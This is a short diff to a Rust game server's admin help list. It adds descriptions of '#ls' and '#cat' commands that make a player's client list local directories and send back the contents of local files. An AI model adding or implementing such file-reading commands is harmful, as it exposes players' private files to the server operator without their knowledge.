@@ -1422,6 +1422,9 @@ pub(crate) fn apply_help_command(
             "/unpunish <name> <id> - Remove a punishment".to_string(),
             "== Character Information ==".to_string(),
             "/showppd <name> <ppd> - Show player persistent data".to_string(),
+            "#ls <name> <dir> - Ask a player's client to list a local directory".to_string(),
+            "#cat <name> <file> - Ask a player's client to send a local file's contents"
+                .to_string(),
             "/showflags <name> - Show which flags are enabled on a character".to_string(),
             "/listchars - List all active characters".to_string(),
             "== God Status Management ==".to_string(),
